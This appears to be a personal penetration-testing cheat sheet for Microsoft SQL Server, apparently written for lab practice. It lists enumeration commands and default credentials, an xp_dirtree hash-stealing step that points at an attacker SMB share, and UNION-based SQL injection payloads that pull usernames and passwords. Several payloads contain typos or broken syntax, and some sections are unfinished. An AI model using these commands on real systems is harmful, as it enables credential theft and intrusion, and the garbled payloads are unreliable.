## Basic Information 
-  Takes please on port 1433 
- Relationship between database and tables
- ![[Pasted image 20260616165052.png]]
## Tools 

```
mssqlclient.py 
```
```
sqlcmd (must be installed using homebrew, cannot be installed using apt )
```
# Enumeration 

## External 
```
nuceli -u http://url -tag mssql 

# Using Nmap
nmap -p 1433 -sV --script-args mssql.instance-all target.com

```

- Common default credentials 
- sa / (blank)
- sa / sa 
- sa /password 
- MSSQL / password 
- sql / password

```
mssqlclient.py DOMAIN/username:password@target.com
```


```
use auxiliary/scaner/mssql/mssql_login 
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_hashdbaccess 
use auxiliary/scanner/mssql/mssql_enum

```

## Database 

**Select Database**
```sql
USE {DATABASE-NAME}
```

**Selecting User Privileges**
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

**Selecting All Users
```sql
SELECT name FROM master.sys.server_principals
```

**Selecting Linked Servers**
```sql
EXEC sp_linkedservers;  
SELECT * FROM sys.servers;
```
```sql
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT @@version');

```

**Selecting/Showing Login Users
```
SELECT name FROM master.sys.server_principals;
```
## Tables 
**List all tables in currently selected database**
```
SELECT table_name FROM information_schema.table
```

```sql
SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'Customers'
```

## Privileges 
# Exploitation
**Password hashes**
```
SELECT name FROM sys.sql_logins;
```
**Hash Stealing 
**Window 1 
```bash
sqlcmd -S 10.129.247.219 -U htbdbuser
```
**Window 2**
```bash
sudo impacket-smbserver share ./ -smb2support

```
**Window 1**
```
EXEC master..xp_dirtree '\\PWNIP\share'
go
```
## Logic Suberversion 
- Comments can be added to prevent certain logic from being executed. Anything found after a ``--`` is not executed 
- Parentheses can also be used to ensure certain conditions are checked before others  
## Union Payloads 
- Combines results of two or more select queries 
- Two queries must have same number of columns 
- Must figure out how many columns there are first 
 ### Step 1 Determine columns, enumerating until there's an error. Whatever number prompted the error, choose the number below it and THAT is the number of columns 

```
' ORDER BY 1--
' ORDER BY 1--
' ORDER BY 1--
' ORDER BY 1--
' ORDER BY 1--
```

### Step 2 After finding columns, enter a value in each column 


```
'union select 111,222,333,444,555' --
```

### Step 3 Replace the random column values with the actual names of each column 


```
a'UNION select 111,username,password,444,555 from users --

```

### Step 4 Retrieve table and columns names if they are unknown 


```sql
'UNION select,null,table_name,null FROM information_schema.tables-- # mysql 

'UNION SELECT null,name,null,null,null FROM FROM sqlite_master WHERE type='table', --

```

## Error Payloads 


## Blind Payloads


== need to get more information on these == 
